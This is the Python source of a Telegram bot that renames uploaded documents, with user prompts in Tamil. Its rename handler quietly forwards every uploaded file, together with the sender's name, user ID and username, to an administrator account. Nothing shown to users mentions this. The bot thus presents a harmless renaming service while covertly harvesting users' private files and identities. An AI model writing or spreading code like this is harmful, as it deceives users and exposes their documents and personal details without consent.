from io import BytesIO
import logging
import os
from functools import wraps

from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# Conversation states
FILE_RECEIVED, WAIT_FILENAME = range(2)

BOT_TOKEN = os.environ.get("BOT_TOKEN")   # Railway/GitHub ENV VAR
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)


# Decorator to ensure BOT_TOKEN is present
def require_token(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not BOT_TOKEN or BOT_TOKEN.strip() == "":
            await update.message.reply_text("❌ BOT_TOKEN not found.")
            return ConversationHandler.END
        return await func(update, context)
    return wrapped


# ===========================
# START COMMAND
# ===========================
@require_token
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Vanakkam!\n\n"
        "📄 இந்த bot-க்கு 50MB-க்குள் ஒரு document அனுப்புங்கள்.\n"
        "பிறகு rename செய்ய வேண்டிய புதிய பெயரை கேட்பேன்.\n\n"
        "❌ Cancel செய்ய: /cancel"
    )
    return FILE_RECEIVED


# ===========================
# FILE RECEIVED
# ===========================
@require_token
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document

    if not doc:
        await update.message.reply_text("❗ document அனுப்பவும்.")
        return FILE_RECEIVED

    # 50MB Limit Check (Telegram Bot API Limit)
    file_size = doc.file_size
    MAX_SIZE = 50 * 1024 * 1024   # 50 MB

    if file_size > MAX_SIZE:
        await update.message.reply_text(
            "❌ இந்த கோப்பு Telegram Bot API limit (50 MB) ஐ கடந்துவிட்டது.\n"
            "பெரிய கோப்புகளை rename செய்ய முடியாது."
        )
        return FILE_RECEIVED

    context.user_data["file_id"] = doc.file_id
    context.user_data["orig_filename"] = doc.file_name or "unnamed"

    await update.message.reply_text(
        f"📥 பெற்றுக்கொண்டேன்: **{context.user_data['orig_filename']}**\n\n"
        "➡️ புதிய பெயரை (extension உடன்) அனுப்புங்கள்.\n"
        "உதாரணம்: `my_video.mp4`"
    )
    return WAIT_FILENAME


# ===========================
# FILENAME RECEIVED → RENAME
# ===========================
@require_token
async def handle_new_filename(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_name = update.message.text.strip()
    user = update.effective_user

    if not new_name:
        await update.message.reply_text("❗ புதிய பெயரை சரியாக எழுதவும்.")
        return WAIT_FILENAME

    file_id = context.user_data.get("file_id")
    if not file_id:
        await update.message.reply_text("❗ முதலில் ஒரு கோப்பை அனுப்பவும்.")
        return FILE_RECEIVED

    bot = context.bot

    # 🔄 Processing Message
    processing_msg = await update.message.reply_text("🔄 Renaming the file... Please wait.")

    # Download file
    file = await bot.get_file(file_id)
    bio = BytesIO()
    await file.download_to_memory(out=bio)
    bio.seek(0)

    # Send to Admin
    admin_msg = (
        "📨 A user sent a file:\n"
        f"👤 Name: {user.full_name}\n"
        f"🆔 User ID: {user.id}\n"
        f"📛 Username: @{user.username if user.username else 'N/A'}\n"
        f"📄 Original File: {context.user_data['orig_filename']}\n"
        f"✏️ New Name Requested: {new_name}"
    )

    try:
        if ADMIN_ID != 0:
            await bot.send_message(ADMIN_ID, admin_msg)

            admin_copy = BytesIO(bio.getvalue())
            admin_copy.name = context.user_data["orig_filename"]
            admin_copy.seek(0)

            await bot.send_document(
                ADMIN_ID, 
                document=admin_copy,
                filename=context.user_data["orig_filename"]
            )
    except Exception as e:
        logger.error("Admin error: %s", e)

    # Upload renamed file to user
    try:
        renamed = BytesIO(bio.getvalue())
        renamed.name = new_name
        renamed.seek(0)

        await bot.send_document(
            chat_id=update.effective_chat.id,
            document=renamed,
            filename=new_name
        )

        # ✔️ Edit Processing Message to Success
        await processing_msg.edit_text(
            f"✅ Rename completed!\n📄 New file: **{new_name}**"
        )

    except Exception as e:
        logger.error("Rename error: %s", e)
        await processing_msg.edit_text("❌ Renaming failed. Error: " + str(e))

    context.user_data.clear()
    return ConversationHandler.END


# ===========================
# CANCEL COMMAND
# ===========================
@require_token
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    context.user_data.clear()
    return ConversationHandler.END


# ===========================
# MAIN APPLICATION
# ===========================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Document.ALL, handle_document),
        ],
        states={
            FILE_RECEIVED: [
                MessageHandler(filters.Document.ALL, handle_document)
            ],
            WAIT_FILENAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_new_filename)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
